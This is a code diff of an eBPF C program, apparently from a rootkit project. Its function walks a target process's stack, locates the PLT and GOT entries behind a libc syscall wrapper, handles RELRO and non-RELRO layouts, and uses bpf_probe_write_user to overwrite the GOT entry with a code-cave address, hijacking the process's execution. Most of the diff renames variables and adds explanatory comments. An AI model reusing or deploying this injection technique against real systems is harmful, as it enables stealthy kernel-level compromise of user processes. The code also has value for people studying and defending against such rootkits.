@@ -64,121 +64,114 @@ static __always_inline int check_syscall_opcodes(__u8* opcodes){
 
 }   
 
-static __always_inline int stack_extract_return_address_plt(__u64 stack){
-    //We have a possible call instruction, we check if it starts with the correct format
-    __u64 *op = (__u64*)(stack - 0x5);
-    __u8 opcode_arr[10];
-    if(bpf_probe_read(&opcode_arr, 10*sizeof(__u8), op)<0){
+static __always_inline int stack_extract_return_address_plt(__u64 stack_rip){
+    //We have a possible RIP from the stack, to which we can take the previous instruction, 
+    //and check if its opcodes correspond with the expected format
+    __u64 *entry_call_addr = (__u64*)(stack_rip - 0x5);
+    __u8 entry_call_opcode_arr[10];
+    if(bpf_probe_read(&entry_call_opcode_arr, 10*sizeof(__u8), entry_call_addr)<0){
         //bpf_printk("Failed to read stack position\n");
         return -1;
     }
-    //bpf_printk(" -- Checking: %lx, res: %x %x", op, opcode_arr[0], opcode_arr[1]);
-    //bpf_printk("%x %x %x\n", opcode_arr[2], opcode_arr[3], opcode_arr[4]);
-    if (opcode_arr[0] != OPCODE_JUMP_BYTE_0) {
-        //bpf_printk(" -- Failed OPCODE: %x\n", opcode_arr[0]);
+    //bpf_printk(" -- Checking: %lx, res: %x %x", entry_call_addr, entry_call_opcode_arr[0], entry_call_opcode_arr[1]);
+    //bpf_printk("%x %x %x\n", entry_call_opcode_arr[2], entry_call_opcode_arr[3], entry_call_opcode_arr[4]);
+    if (entry_call_opcode_arr[0] != OPCODE_JUMP_BYTE_0) {
+        //bpf_printk(" -- Failed OPCODE: %x\n", entry_call_opcode_arr[0]);
         return -1;
     }
-    bpf_printk("Success OPCODE: %lx\n", op);
+    bpf_printk("Successful entry call address: %lx\n", entry_call_addr);
 
-    //We have localized the call instruction and thus quite probably the saved RIP. 
+    //We have localized a call instruction which might be the one we are looking for. 
     //We proceed to get the offset of the call.
     __s32 offset = 0;
-    __u8* op8 = (__u8*)(stack - 0x5);
-    if(bpf_probe_read_user(&offset, sizeof(__s32), &op8[1])<0){ //This takes the 4 MSB omitting the first
-        bpf_printk("Failed to read op[1]\n");
+    __u8* entry_call_addr_8 = (__u8*)(stack_rip - 0x5);
+    if(bpf_probe_read_user(&offset, sizeof(__s32), &entry_call_addr_8[1])<0){ //This takes the 4 MSB omitting the first
+        bpf_printk("Failed to read entry_call_addr[1]\n");
         return -1;
     }
-    bpf_printk("OP64[1]: %x\n", &op[1]);
-    bpf_printk("OP8[1]: %x\n", &op8[1]);
+    //bpf_printk("OP64[1]: %x\n", &entry_call_addr[1]);
+    //bpf_printk("OP8[1]: %x\n", &entry_call_addr_8[1]);
+    
+    //We now extract to which memory position it jumps via its offset+current position+5 bytes of the
+    //current call instruction.
     bpf_printk("OFFSET: %x\n", offset);
-    bpf_printk("OP: %lx\n", op);
-    __u64 sum = (uintptr_t)((__u64)(op8)+offset+5);
+    bpf_printk("OP: %lx\n", entry_call_addr);
+    __u64 sum = (uintptr_t)((__u64)(entry_call_addr_8)+offset+5);
     bpf_printk("SUM: %lx\n", sum);
-    __u64* call_addr = (__u64*)sum;
+    __u64* plt_addr = (__u64*)sum;
 
-    //We check the opcodes of the instruction that jumps to libc using the offset at GOT.PLT.
-    __u64 call_opcode;
-    bpf_printk("CALL_ADDR: %lx\n", call_addr);
-    int ret;
-    if ((ret = bpf_probe_read_user(&call_opcode, sizeof(__u64), call_addr)) < 0){
-        bpf_printk("Failed to read memory at %x, RET IS %i\n", call_addr, ret);
-        //call_dest = *call_addr;
-        //bpf_printk("DEST: %lx\n", call_dest);
-        return -1;
-    }
-    bpf_printk("CALL_OPCODES: %lx\n", call_opcode);
-
-    bpf_probe_read_user(&opcode_arr, 10*sizeof(__u8), call_addr);
-    bpf_printk("OPCODE0: %x\n", opcode_arr[0]);
-    bpf_printk("OPCODE1: %x\n", opcode_arr[1]);
-    bpf_printk("OPCODE5: %x\n", opcode_arr[5]);
-    bpf_printk("OPCODE6: %x\n", opcode_arr[6]);
+    //Using the bytes written in the PLT.GOT section, the PLT jumps to libc, where
+    //the syscall will be called. We can extract the opcodes of this routine and
+    //see if we recognize the syscall as the one we wanted.
+    __u8 libc_opcodes[10];
+    bpf_probe_read_user(&libc_opcodes, 10*sizeof(__u8), plt_addr);
+    bpf_printk("OPCODE0: %x\n", libc_opcodes[0]);
+    bpf_printk("OPCODE1: %x\n", libc_opcodes[1]);
+    bpf_printk("OPCODE5: %x\n", libc_opcodes[5]);
+    bpf_printk("OPCODE6: %x\n", libc_opcodes[6]);
 
     int plt_found = 0;
     int relro_active = 0;
     
     //Check documentation for details on jump recognition.
-    if(opcode_arr[0]==OPCODE_PLT_JMP_BYTE_0 && opcode_arr[1]==OPCODE_PLT_JMP_BYTE_1){
+    if(libc_opcodes[0]==OPCODE_PLT_JMP_BYTE_0 && libc_opcodes[1]==OPCODE_PLT_JMP_BYTE_1){
         //If the ELF binary has been compiled without RELRO, the first bytes are expected.
         plt_found = 1;
-    }else if(opcode_arr[0]==OPCODE_PLT_RERLO_BYTE_0 && opcode_arr[1]==OPCODE_PLT_RERLO_BYTE_1 && opcode_arr[5]==OPCODE_PLT_JMP_BYTE_0 && opcode_arr[6]==OPCODE_PLT_JMP_BYTE_1){
+    }else if(libc_opcodes[0]==OPCODE_PLT_RERLO_BYTE_0 && libc_opcodes[1]==OPCODE_PLT_RERLO_BYTE_1 && libc_opcodes[5]==OPCODE_PLT_JMP_BYTE_0 && libc_opcodes[6]==OPCODE_PLT_JMP_BYTE_1){
         //If the ELF was compiled with RELRO protection.
         plt_found = 1;
         relro_active = 1;
     }
         
-    __u8* call_addr_arr = (__u8*)call_addr;
+    __u8* plt_addr_arr = (__u8*)plt_addr;
     if(plt_found == 1){
         bpf_printk("Found PLT entry\n");
-        __s32 j_offset;
-        __u64* j_addr;
+        __s32 got_offset;
+        __u64* got_addr;
         
         if(relro_active == 0){
             //We analyze the offset of the jump specified ff 25 XX XX XX XX
             //The address to which the jump takes us from the PLT.GOT should be the actual syscall setup
-            bpf_probe_read_user(&j_offset, sizeof(__s32), &call_addr_arr[2]); //4 LSB 
+            bpf_probe_read_user(&got_offset, sizeof(__s32), &plt_addr_arr[2]); //4 LSB 
             //We obtain the address of the jump by adding the offset + our current memory address + 6 bytes of the current instruction
-            j_addr = (u64*)((__u64)(call_addr_arr) + j_offset + 0x6);
-            bpf_printk("JOFFSET: %lx\n", j_offset);
-            bpf_printk("JADDR: %lx\n", j_addr);
+            got_addr = (u64*)((__u64)(plt_addr_arr) + got_offset + 0x6);
+            bpf_printk("GOT_OFFSET: %lx\n", got_offset);
+            bpf_printk("GOT_ADDR: %lx\n", got_addr);
         }else {
             bpf_printk("RELRO detected\n");
             //Proceed to take into account the endbr64 instruction
-            call_addr_arr = (__u8*)call_addr+0x4;
+            plt_addr_arr = (__u8*)plt_addr+0x4;
             //We analyze the offset of the jump specified f2 ff 25 XX XX XX XX
             //The address to which the jump takes us from the PLT.GOT should be the actual syscall setup
-            bpf_probe_read_user(&j_offset, sizeof(__s32), &call_addr_arr[3]); //4 LSB + 7 bytes of the current instruction
-            j_addr = (u64*)((__u64)(call_addr_arr) + j_offset +0x7);
-            bpf_printk("JOFFSET: %lx\n", j_offset);
-            bpf_printk("JADDR: %lx\n", j_addr);
+            bpf_probe_read_user(&got_offset, sizeof(__s32), &plt_addr_arr[3]); //4 LSB + 7 bytes of the current instruction
+            got_addr = (u64*)((__u64)(plt_addr_arr) + got_offset +0x7);
+            bpf_printk("GOT_OFFSET: %lx\n", got_offset);
+            bpf_printk("GOT_ADDR: %lx\n", got_addr);
         }
         
-        //Now that we have the address of the jump, we proceed to get the instruction opcodes there
-        //However it's a bit more complex since what we have is the address in the GOT section where
-        //the linker will place the address inside the shared library where the function is located.
-        //More info in the documentation.
-        __u64 got_addr;
-        if(j_addr==NULL){
+        //The actual starting address at which the GOT section points in libc is contained in the previous pointer
+        __u64 got_libc_addr;
+        if(got_addr==NULL){
             return -1;
         }
-        bpf_probe_read_user(&got_addr, sizeof(__u64), j_addr);
-        bpf_printk("GOT_ADDR: %lx\n",got_addr);
+        bpf_probe_read_user(&got_libc_addr, sizeof(__u64), got_addr);
+        bpf_printk("GOT_ADDR_LIBC: %lx\n",got_libc_addr);
 
-        __u64 buf = (__u64)CODE_CAVE_ADDRESS_STATIC;
-        bpf_printk("Now writing to J_ADDR %lx\n", j_addr);
-        if(bpf_probe_write_user(j_addr, &buf, sizeof(__u64))<0){
+        __u64 buf = CODE_CAVE_ADDRESS_STATIC;
+        //bpf_printk("Now writing to GOT_ADDR_LIBC %lx\n", got_libc_addr);
+        if(bpf_probe_write_user(got_addr, &buf, sizeof(__u64))<0){
             //Should not work if RELRO active
             bpf_printk("FAILED TO WRITE JUMP\n");
         }else{
             __u64 got_addr_new;
-            bpf_probe_read_user(&got_addr_new, sizeof(__u64), j_addr);
+            bpf_probe_read_user(&got_addr_new, sizeof(__u64), got_addr);
             bpf_printk("Success, new GOT is %lx", got_addr_new);
         }
 
         //Now that we have the address placed in the GOT section we can finally go to the function in glibc
         //where the syscall resides. We read the opcodes and check that they are the ones expected
         __u8 s_opcode[14];
-        bpf_probe_read_user(s_opcode, 14*sizeof(__u8), (void*)got_addr);
+        bpf_probe_read_user(s_opcode, 14*sizeof(__u8), (void*)got_libc_addr);
         for(int ii=0; ii<14; ii++){
             //bpf_printk("S_OPC %i: %x\n",ii,s_opcode[ii]);
         }
@@ -199,12 +192,12 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
             return -1;
         }
 
-        bpf_printk("Final found libc syscall address: %lx\n", got_addr);
+        bpf_printk("Final found libc syscall address: %lx\n", got_libc_addr);
         struct inj_ret_address_data addr;
-        addr.libc_syscall_address = (__u64)got_addr;
+        addr.libc_syscall_address = (__u64)got_libc_addr;
         addr.stack_ret_address = 0;
         addr.relro_active = relro_active;
-        bpf_probe_read(&addr.got_address, sizeof(__u64), &j_addr);
+        bpf_probe_read(&addr.got_address, sizeof(__u64), &got_addr);
         bpf_map_update_elem(&inj_ret_address, &pid_tgid, &addr, BPF_ANY);
 
         return 0;
